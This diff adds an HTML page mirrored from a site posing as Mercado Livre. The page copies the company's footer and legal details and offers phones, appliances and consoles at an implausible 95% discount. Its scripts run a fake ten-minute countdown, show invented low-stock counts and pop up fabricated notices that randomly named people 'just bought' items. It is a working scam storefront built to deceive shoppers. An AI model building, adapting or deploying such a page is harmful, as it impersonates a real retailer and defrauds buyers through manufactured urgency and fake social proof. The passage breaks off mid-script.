@@ -1,0 +1,741 @@
+<!DOCTYPE html><html lang="pt"><!-- Mirrored from exclusivalojas.com/loja/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Oct 2024 14:42:25 GMT --><head>
+    
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    
+        <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-5T038432C4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5T038432C4');
+</script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Mercado Livre</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
+    <link rel="icon" href="images/favicon.png">
+    <link rel="shortcut icon" href="images/favicon.png">
+    
+</head>
+<body>
+
+        <script src="js/latest_1.js" async="" defer=""></script>
+   
+    <div style="background-color: #131313; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: Aniversário 25 Anos!</div>
+
+
+    <img src="images/banner_1.jpg" style="width: 100%; margin-top: -2px;">
+
+
+
+    <p id="mensagem" class="mensagem">Desconto aplicado! Promoção disponível por:</p>
+
+    <div class="contador">
+        <div class="contador-tempo">
+            <div class="tempo-box">
+                <span id="minutos">10</span>
+            </div>
+            <span class="tempo-texto">minutos</span>
+        </div>
+        <div class="contador-tempo">
+            <div class="tempo-box">
+                <span id="segundos">00</span>
+            </div>
+            <span class="tempo-texto">segundos</span>
+        </div>
+    </div>
+    
+    
+    <script>
+        // Definindo o tempo inicial em segundos
+        let tempoRestante = 10 * 60;
+
+        const minutosElemento = document.getElementById('minutos');
+        const segundosElemento = document.getElementById('segundos');
+        const mensagemElemento = document.getElementById('mensagem');
+
+        const intervalo = setInterval(() => {
+            const minutos = Math.floor(tempoRestante / 60);
+            const segundos = tempoRestante % 60;
+
+            minutosElemento.textContent = String(minutos).padStart(2, '0');
+            segundosElemento.textContent = String(segundos).padStart(2, '0');
+
+            if (tempoRestante <= 0) {
+                clearInterval(intervalo);       
+                mensagemElemento.textContent = "Última chance para escolher seu produto com 95% de desconto, não perca!";
+            } else {
+                tempoRestante--;
+            }
+        }, 1000);
+
+    </script>
+
+    
+
+
+    <div class="bracelet-grid">
+
+        <!--------------------- iPhone --------------------->
+
+
+        <div class="bracelet-item" onclick="redirecionar('./iphone/index.html')">
+            <div class="product-image">
+                <img src="images/iphone1.avif" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 5299,99</div>
+
+                <span class="new-price">R$ 96,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #ffcbcb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #580404; font-family: 'GellixRegular'; margin-left: 2%;">Restam 4 unidades</p>
+                </div>
+
+                <p class="product-name">Apple iPhone 14 Pro Max 256Gb</p>
+            </div>
+        </div>
+
+        <!--------------------- Geladeira --------------------->
+        
+        
+        <div class="bracelet-item" onclick="redirecionar('./geladeira/index.html')">
+            <div class="product-image">
+                <img src="images/geladeira1.png" style="height: 130px; width: auto;">
+            </div>
+    
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 3999,99</div>
+
+                <span class="new-price">R$ 92,70</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #cbffcb; width: 81%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #045823; font-family: 'GellixRegular'; margin-left: 2%;">Restam 11 unidades</p>
+                </div>
+
+                <p class="product-name">Geladeira Brastemp Frost 588 Litros</p>
+            </div>
+        </div>
+
+        <!--------------------- Celular --------------------->
+
+
+        <div class="bracelet-item" onclick="redirecionar('./s24/index.html')">
+            <div class="product-image">
+                <img src="images/s241.jpg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 5999,90</div>
+
+                <span class="new-price">R$ 96,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #cbffcb; width: 81%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #045823; font-family: 'GellixRegular'; margin-left: 2%;">Restam 14 unidades</p>
+                </div>
+
+                <p class="product-name">Samsung Galaxy S24 Ultra</p>
+            </div>
+        </div>
+
+       
+
+
+        <!--------------------- Partybox --------------------->
+
+
+        <div class="bracelet-item" onclick="redirecionar('./partybox/index.html')">
+            <div class="product-image">
+                <img src="images/partybox1.jpg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 4839,90</div>
+
+                <span class="new-price">R$ 98,38</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 7 unidades</p>
+                </div>
+
+                <p class="product-name">Caixa De Som JBL Partybox 710</p>
+            </div>
+        </div>
+
+         <!--------------------- Boombox --------------------->
+
+
+         <div class="bracelet-item" onclick="redirecionar('./boombox3/index.html')">
+            <div class="product-image">
+                <img src="images/boombox1.jpg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 2099,90</div>
+
+                <span class="new-price">R$ 84,19</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 9 unidades</p>
+                </div>
+
+                <p class="product-name">Caixa de Som JBL Boombox 3</p>
+            </div>
+        </div>
+
+        
+
+        <!--------------------- TV --------------------->
+
+        <div class="bracelet-item" onclick="redirecionar('./tv/index.html')">
+            <div class="product-image">
+                <img src="images/tv1.webp" style="width: 95%; display: flex; margin: 0 auto; justify-content: center; vertical-align: center; padding-top: 15px">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 2999,90</div>
+
+                <span class="new-price">R$ 87,00</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #cbffcb; width: 81%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #045823; font-family: 'GellixRegular'; margin-left: 2%;">Restam 19 unidades</p>
+                </div>
+
+                <p class="product-name">Smart TV 43 polegadas Philco</p>
+            </div>
+        </div>
+
+        
+
+
+        <!--------------------- Notebook --------------------->
+
+
+        <div class="bracelet-item" onclick="redirecionar('./notebook/index.html')">
+            <div class="product-image">
+                <img src="images/notebook1.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 2999,90</div>
+
+                <span class="new-price">R$ 87,00</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #ffcbcb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #580404; font-family: 'GellixRegular'; margin-left: 2%;">Restam 5 unidades</p>
+                </div>
+
+                <p class="product-name">Notebook Galaxy Book2 intel core i7</p>
+            </div>
+        </div>
+
+
+        
+        <!--------------------- Máquina de lavar --------------------->
+
+
+        <div class="bracelet-item" onclick="redirecionar('./lava/index.html')">
+            <div class="product-image">
+                <img src="images/lavar1.jpg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 3999,99</div>
+
+                <span class="new-price">R$ 92,70</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 8 unidades</p>
+                </div>
+
+                <p class="product-name">Lava E Seca Samsung Inox 11kg</p>
+            </div>
+        </div>
+        <div class="bracelet-item" onclick="redirecionar('./parafusadeira/index.html')">
+            <div class="product-image">
+                <img src="images/parafusadeira3.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 270,00</div>
+
+                <span class="new-price">R$ 87,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #ffcbcb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #580404; font-family: 'GellixRegular'; margin-left: 2%;">Restam 4 unidades</p>
+                </div>
+
+                <p class="product-name">Parafusadeira Furadeira De Impacto Profissional</p>
+            </div>
+        </div>
+        <div class="bracelet-item" onclick="redirecionar('./ps5-slim/index.html')">
+            <div class="product-image">
+                <img src="images/play1.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 3500,00</div>
+
+                <span class="new-price">R$ 127,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #ffcbcb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #580404; font-family: 'GellixRegular'; margin-left: 2%;">Restam 2 unidades</p>
+                </div>
+
+                <p class="product-name">Playstation Ps5 Slim Standard</p>
+            </div>
+        </div>
+        <div class="bracelet-item" onclick="redirecionar('./iphone16/index.html')">
+            <div class="product-image">
+                <img src="images/iph1.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 11200,00</div>
+
+                <span class="new-price">R$ 147,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #ffcbcb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #580404; font-family: 'GellixRegular'; margin-left: 2%;">Restam 1 unidade</p>
+                </div>
+
+                <p class="product-name">Apple iPhone 16 Pro Max (256 GB)</p>
+            </div>
+        </div>
+        <div class="bracelet-item" onclick="redirecionar('./fogao-5/index.html')">
+            <div class="product-image">
+                <img src="images/fo.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 999,99</div>
+
+                <span class="new-price">R$ 95,00</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 8 unidades</p>
+                </div>
+
+                <p class="product-name">Fogão 5 Bocas Preto com Mesa Inox Atlas Mônaco Plus</p>
+            </div>
+        </div>
+                <div class="bracelet-item" onclick="redirecionar('./ar-condicionado/index.html')">
+            <div class="product-image">
+                <img src="images/ar2.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 3.319,00</div>
+
+                <span class="new-price">R$ 165,95</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 8 unidades</p>
+                </div>
+
+                <p class="product-name">Ar Condicionado Split Inverter LG Hi Wall DUAL Compact +AI 9000 BTUs Quente e Frio</p>
+            </div>
+        </div>
+                <div class="bracelet-item" onclick="redirecionar('./kit-chandon/index.html')">
+            <div class="product-image">
+                <img src="images/1.png" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 799,00</div>
+
+                <span class="new-price">R$ 87,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 11 unidades</p>
+                </div>
+
+                <p class="product-name">Kit Chandon Reserve Brut 6 Garrafas 750ml + 1 Magnum 1500m</p>
+            </div>
+        </div>
+                        <div class="bracelet-item" onclick="redirecionar('./Air-Fryer/index.html')">
+            <div class="product-image">
+                <img src="images/fri1.jpeg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 699,00</div>
+
+                <span class="new-price">R$ 97,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 6 unidades</p>
+                </div>
+
+                <p class="product-name">Fritadeira Elétrica Sem Óleo Air Fryer Mondial Family Inox 4L</p>
+            </div>
+        </div>
+                        <div class="bracelet-item" onclick="redirecionar('./geladeira-branca/index.html')">
+            <div class="product-image">
+                <img src="images/GB.png" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 6.200,65</div>
+
+                <span class="new-price">R$ 157,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 8 unidades</p>
+                </div>
+
+                <p class="product-name">Geladeira Brastemp Frost 588 Litros Branca</p>
+            </div>
+        </div>
+                                <div class="bracelet-item" onclick="redirecionar('./micro-ondas/index.html')">
+            <div class="product-image">
+                <img src="images/mi0.png" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 816,60</div>
+
+                <span class="new-price">R$ 125,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 5 unidades</p>
+                </div>
+
+                <p class="product-name">Micro-ondas Brastemp 32 Litros cor cinza espelhado com Menu Gourmet</p>
+            </div>
+        </div>
+                                <div class="bracelet-item" onclick="redirecionar('./motog/index.html')">
+            <div class="product-image">
+                <img src="images/MOTO.png" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 1.070,10</div>
+
+                <span class="new-price">R$ 107,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 14 unidades</p>
+                </div>
+
+                <p class="product-name">Motorola Moto G54 5G 128GB Grafite 4GB RAM</p>
+            </div>
+        </div>
+                                        <div class="bracelet-item" onclick="redirecionar('./tramontina-vermelha/index.html')">
+            <div class="product-image">
+                <img src="images/pa01.png" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 509,97</div>
+
+                <span class="new-price">R$ 79,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 2 unidades</p>
+                </div>
+
+                <p class="product-name">Kit 9pçs Tramontina Antiaderente Paris</p>
+            </div>
+        </div>
+                                        <div class="bracelet-item" onclick="redirecionar('./tramontina-branca/index.html')">
+            <div class="product-image">
+                <img src="images/rVQlb3c58kfa.jpg" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 519,90</div>
+
+                <span class="new-price">R$ 79,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 5 unidades</p>
+                </div>
+
+                <p class="product-name">Jogo De Panelas Vanilla 10pçs Indução Antiaderente Brinox</p>
+            </div>
+        </div>
+                                                <div class="bracelet-item" onclick="redirecionar('./pocco/index.html')">
+            <div class="product-image">
+                <img src="images/poco.png" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 2.160,00</div>
+
+                <span class="new-price">R$ 108,00</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 2 unidades</p>
+                </div>
+
+                <p class="product-name">Smartphone Pocco X6 Pro 256GB, 8GB RAM, Tela 6,67</p>
+            </div>
+        </div>
+
+        <div class="bracelet-item" onclick="redirecionar('./Switch2/index.html')">
+            <div class="product-image">
+                <img src="images/nintendo.webp" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 4.999,90</div>
+
+                <span class="new-price">R$ 299,90</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 2 unidades</p>
+                </div>
+
+                <p class="product-name">Console Nintendo Switch 2</p>
+            </div>
+        </div>
+
+                                        <div class="bracelet-item" onclick="redirecionar('./tv-55/index.html')">
+            <div class="product-image">
+                <img src="images/tv4.png" style="height: 130px; width: auto;">
+            </div>
+            <div class="product-info">
+                <div class="offer-tag">OFERTA DO DIA</div>
+
+                <div class="old-price">R$ 4.403,00</div>
+
+                <span class="new-price">R$ 220,15</span><span class="discount">95% OFF</span>
+
+                <div class="free-shipping-container">
+                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
+                </div>
+
+                <div style="background-color: #fffccb; width: 77%; border-radius: 5px; padding: 0px 5px">
+                    <p style="font-size: 14px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 5 unidades</p>
+                </div>
+
+                <p class="product-name">Samsung Smart Tv 55 Polegadas Qled 4k 2024</p>
+            </div>
+        </div>
+
+
+
+
+        
+
+
+        
+
+
+
+        
+
+    </div>
+
+
+    <div class="divisoria2"></div>
+
+    <p style="margin-left: 3%; margin-right: 3%; font-family: 'GellixRegular'; font-size: 14px; padding-top: 5px;"><span style="font-family: 'GellixSemiBold';">Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span><br><br>© 1999-2024 Ebazar.com.br LTDA.CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.<span style="font-family: 'GellixSemiBold';"><br><br>Brasil/Português</span></p>
+
+<script>
+  window.pixelId = "67f9cb1f92f9b9dafdd95a1f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>   
+    
+
+
+
+
+
+
+<script src="js/notiflix-aio-2.6.0.min.js"></script>
+
+       <script> /right-top, right-bottom, left-top, left-bottom, center-top, center-bottom, center-center/
+        var position = "left-bottom";
+ 
+        /verde, azul, vermelho, amarelo/
+        var color = "verde";
+ 
+        /fade, zoom, from-right, from-left, from-top, from-bottom/
+        var animation = "from-left";
+ 
+        /nome do produto/
+        var product_name = "";
+ 
+        /frase depois do nome da pessoa/
+        var phrase = "acabou de comprar com 95% de desconto";
+        var timeout = 2000;
+ 
+        /masc, fem, any/
+        var type_name = "masc, fem";
+        var msg_final = "";
+ 
+        var min_time = 1;
+        var max_time = 5;
+ 
+        var names_masc = ['Jose', 'Joao', 'Antonio', 'Francisco', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Luiz', 'Marcos', 'Luis', 'Gabriel', 'Rafael', 'Daniel', 'Marcelo', 'Bruno', 'Eduardo', 'Felipe', 'Rodrigo', 'Manoel', 'Mateus', 'Andre', 'Fernando', 'Fabio', 'Leonardo', 'Gustavo', 'Guilherme', 'Leandro', 'Tiago', 'Anderson', 'Ricardo', 'Marcio', 'Jorge', 'Alexandre', 'Roberto', 'Edson', 'Diego', 'Vitor', 'Sergio', 'Claudio', 'Matheus', 'Thiago', 'Geraldo', 'Adriano', 'Luciano', 'Julio', 'Renato', 'Alex', 'Vinicius', 'Rogerio', 'Samuel', 'Ronaldo', 'Mario', 'Flavio', 'Douglas', 'Igor', 'Davi', 'Manuel', 'Jeferson', 'Cicero', 'Victor', 'Miguel', 'Robson', 'Mauricio', 'Danilo', 'Henrique', 'Caio', 'Reginaldo', 'Joaquim', 'Benedito', 'Gilberto', 'Marco', 'Alan', 'Nelson', 'Cristiano', 'Elias', 'Wilson', 'Valdir', 'Emerson', 'Luan', 'David', 'Renan', 'Severino', 'Fabricio', 'Mauro', 'Jonas', 'Gilmar', 'Jean', 'Fabiano', 'Wesley', 'Diogo', 'Adilson', 'Jair', 'Alessandro', 'Everton', 'Osvaldo', 'Gilson', 'Willian', 'Joel', 'Silvio', 'Helio', 'Maicon', 'Reinaldo', 'Pablo', 'Artur', 'Vagner', 'Valter', 'Celso', 'Ivan', 'Cleiton', 'Vanderlei', 'Vicente', 'Arthur', 'Milton', 'Domingos', 'Wagner', 'Sandro', 'Moises', 'Edilson', 'Ademir', 'Adao', 'Evandro', 'Cesar', 'Valmir', 'Murilo', 'Juliano', 'Edvaldo', 'Ailton', 'Junior', 'Breno', 'Nicolas', 'Ruan', 'Alberto', 'Rubens', 'Nilton', 'Augusto', 'Cleber', 'Osmar', 'Nilson', 'Hugo', 'Otavio', 'Vinicios', 'Italo', 'Wilian', 'Alisson', 'Aparecido'];
+        var names_fem = ['Maria', 'Ana', 'Francisca', 'Antonia', 'Adriana', 'Juliana', 'Marcia', 'Fernanda', 'Patricia', 'Aline', 'Sandra', 'Camila', 'Amanda', 'Bruna', 'Jessica', 'Leticia', 'Julia', 'Luciana', 'Vanessa', 'Mariana', 'Gabriela', 'Vera', 'Vitoria', 'Larissa', 'Claudia', 'Beatriz', 'Rita', 'Luana', 'Sonia', 'Renata', 'Eliane'];
+ 
+        var option = {
+            position: position,
+            cssAnimationStyle: animation,
+            plainText: false,
+            timeout: timeout
+        };
+ 
+        function show_notification() {
+            if (type_name == "masc") {
+                msg_final = "<strong>" + names_masc[Math.floor(Math.random() * names_masc.length)] + "</strong>";
+            } else if (type_name == "fem") {
+                msg_final = "<strong>" + names_fem[Math.floor(Math.random() * names_fem.length)] + "</strong>";
+            } else {
+                var array_aux = ["masc", "fem"];
+ 
+                if (array_aux[Math.floor(Math.random() * array_aux.length)] == "masc") {
+                    msg_final = "<strong>" + names_masc[Math.floor(Math.random() * names_masc.length)] + "</strong>";
+                } else {
+                    msg_final = "<strong>" + names_fem[Math.floor(Math.random() * names_fem.length)] + "</strong>";
+                }
+            }
+ 
+            msg_final += decodeURIComponent(escape(" " + phrase + " " + product_name));
+ 
+            if (color == "verde") {
+                Notiflix.Notify.Success(msg_final, option);
+            }
+ 
